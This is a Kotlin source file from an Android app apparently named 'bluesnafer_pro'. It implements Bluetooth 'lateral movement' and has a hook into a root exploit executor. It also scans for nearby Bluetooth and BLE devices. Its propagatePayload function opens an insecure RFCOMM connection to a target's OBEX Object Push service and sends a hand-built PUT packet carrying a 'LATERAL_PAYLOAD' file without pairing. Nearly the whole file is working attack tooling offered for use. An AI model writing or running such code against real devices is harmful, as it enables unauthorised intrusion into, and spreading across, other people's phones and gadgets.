package com.bluesnafer_pro

import android.bluetooth.*
import android.bluetooth.le.*
import android.content.*
import android.util.Log
import java.io.*
import java.util.*

object BtlateralMovement {
    private const val TAG = "BtLateral"
    private val OPP_UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")

    @Volatile
    private var isScanning = false

    fun executeWithRoot(device: BluetoothDevice): Map<String, Any> {
        return if (RootUtils.isRootAvailable()) {
            RootExploitExecutor.executeBtLateralMovement(device.address)
        } else {
            val fallback = scanNearby(device)
            mapOf(
                "success" to (fallback["success"] == true),
                "rootRequired" to true,
                "rootAvailable" to false,
                "exploit" to "BT Lateral Movement",
                "message" to "Sin root: escaneo lateral de dispositivos cercanos",
                "fallbackUsed" to true,
                "fallbackResult" to fallback
            )
        }
    }

    data class NearbyDevice(
        val address: String,
        val name: String,
        val rssi: Int,
        val transportType: String
    )

    fun scanNearby(device: BluetoothDevice, durationSec: Int = 10): Map<String, Any> {
        Log.d(TAG, "Lateral scan from ${device.address}")
        val discovered = mutableListOf<NearbyDevice>()
        val adapter = BluetoothAdapter.getDefaultAdapter() ?: return mapOf(
            "success" to false, "error" to "Bluetooth not available"
        )
        val scanner = adapter.bluetoothLeScanner
        val appContext = BluetoothMethodHandler.getAppContext() ?: return mapOf(
            "success" to false, "error" to "No application context"
        )

        var discoverReceiver: BroadcastReceiver? = null
        var scanCallback: ScanCallback? = null

        try {
            isScanning = true

            discoverReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    if (intent?.action == BluetoothDevice.ACTION_FOUND) {
                        val btDevice = intent.getParcelableExtra<BluetoothDevice>(BluetoothDevice.EXTRA_DEVICE)
                        val rssi = intent.getShortExtra(BluetoothDevice.EXTRA_RSSI, 0.toShort()).toInt()
                        if (btDevice != null && btDevice.address != device.address) {
                            synchronized(discovered) {
                                if (discovered.none { it.address == btDevice.address }) {
                                    discovered.add(
                                        NearbyDevice(
                                            btDevice.address,
                                            btDevice.name ?: "Unknown",
                                            rssi,
                                            "BR/EDR"
                                        )
                                    )
                                }
                            }
                        }
                    }
                }
            }
            appContext.registerReceiver(discoverReceiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
            if (adapter.isDiscovering) adapter.cancelDiscovery()
            adapter.startDiscovery()

            scanCallback = object : ScanCallback() {
                override fun onScanResult(callbackType: Int, result: ScanResult) {
                    if (result.device.address != device.address) {
                        synchronized(discovered) {
                            if (discovered.none { it.address == result.device.address }) {
                                discovered.add(
                                    NearbyDevice(
                                        result.device.address,
                                        result.device.name ?: "Unknown",
                                        result.rssi,
                                        "BLE"
                                    )
                                )
                            }
                        }
                    }
                }
            }
            scanner?.startScan(scanCallback)

            Thread.sleep((durationSec * 1000L).coerceIn(2000L, 30_000L))

            adapter.cancelDiscovery()
            scanner?.stopScan(scanCallback)

            return mapOf(
                "success" to discovered.isNotEmpty(),
                "message" to if (discovered.isNotEmpty())
                    "Lateral scan: ${discovered.size} dispositivos cercanos"
                else "Escaneo completado sin dispositivos adicionales",
                "devicesDiscovered" to discovered.size,
                "devices" to discovered.map {
                    mapOf(
                        "address" to it.address,
                        "name" to it.name,
                        "rssi" to it.rssi,
                        "transport" to it.transportType
                    )
                },
                "technique" to "bluetooth_lateral_movement"
            )
        } catch (e: Throwable) {
            return mapOf("success" to false, "error" to (e.message ?: "Lateral scan failed"))
        } finally {
            isScanning = false
            try { adapter.cancelDiscovery() } catch (_: Exception) {}
            try { scanCallback?.let { scanner?.stopScan(it) } } catch (_: Exception) {}
            try { discoverReceiver?.let { appContext.unregisterReceiver(it) } } catch (_: Exception) {}
        }
    }

    fun propagatePayload(
        sourceDevice: BluetoothDevice,
        targetDevice: BluetoothDevice,
        payloadName: String = "payload.txt"
    ): Map<String, Any> {
        Log.d(TAG, "Propagating $payloadName from ${sourceDevice.address} to ${targetDevice.address}")

        return try {
            val socket = targetDevice.createInsecureRfcommSocketToServiceRecord(OPP_UUID)
            socket.connect()

            val input = socket.inputStream
            val output = socket.outputStream

            val connectPkt = byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x20, 0x00)
            output.write(connectPkt)
            output.flush()

            val connectResp = ByteArray(7)
            val connectRead = readAvailable(input, connectResp, 3000)
            if (connectRead < 3 || (connectResp[0].toInt() and 0xFF) != 0xA0) {
                socket.close()
                return mapOf(
                    "success" to false,
                    "error" to "OPP OBEX connect rejected",
                    "technique" to "bluetooth_opp_propagation"
                )
            }

            val body = "LATERAL_PAYLOAD:${sourceDevice.address}".toByteArray(Charsets.UTF_8)
            val nameBytes = payloadName.toByteArray(Charsets.UTF_8)
            val pktLen = 7 + nameBytes.size + 3 + body.size
            val putPkt = ByteArray(pktLen)
            var offset = 0
            putPkt[offset++] = 0x02.toByte()
            putPkt[offset++] = ((pktLen shr 8) and 0xFF).toByte()
            putPkt[offset++] = (pktLen and 0xFF).toByte()
            putPkt[offset++] = 0x01
            putPkt[offset++] = (((nameBytes.size + 3) shr 8) and 0xFF).toByte()
            putPkt[offset++] = ((nameBytes.size + 3) and 0xFF).toByte()
            putPkt[offset++] = 0x00
            System.arraycopy(nameBytes, 0, putPkt, offset, nameBytes.size)
            offset += nameBytes.size
            putPkt[offset++] = 0x49
            putPkt[offset++] = (((body.size + 3) shr 8) and 0xFF).toByte()
            putPkt[offset++] = ((body.size + 3) and 0xFF).toByte()
            putPkt[offset++] = 0x00
            System.arraycopy(body, 0, putPkt, offset, body.size)

            output.write(putPkt)
            output.flush()

            val putResp = ByteArray(16)
            val putRead = readAvailable(input, putResp, 3000)
            socket.close()

            val putCode = if (putRead > 0) putResp[0].toInt() and 0xFF else -1
            val accepted = putCode == 0xA0 || putCode == 0x90

            mapOf(
                "success" to accepted,
                "message" to if (accepted) "Payload aceptado por OPP en ${targetDevice.address}"
                else "OPP rechazó el payload (code=0x${putCode.toString(16)})",
                "payload" to payloadName,
                "obexResponse" to putCode,
                "technique" to "bluetooth_opp_propagation"
            )
        } catch (e: Throwable) {
            mapOf("success" to false, "error" to (e.message ?: "Propagation failed"))
        }
    }

    private fun readAvailable(input: InputStream, buffer: ByteArray, timeoutMs: Int): Int {
        var total = 0
        val deadline = System.currentTimeMillis() + timeoutMs
        while (total < buffer.size && System.currentTimeMillis() < deadline) {
            if (input.available() > 0) {
                val read = input.read(buffer, total, buffer.size - total)
                if (read < 0) break
                total += read
            } else {
                Thread.sleep(20)
            }
        }
        return total
    }
}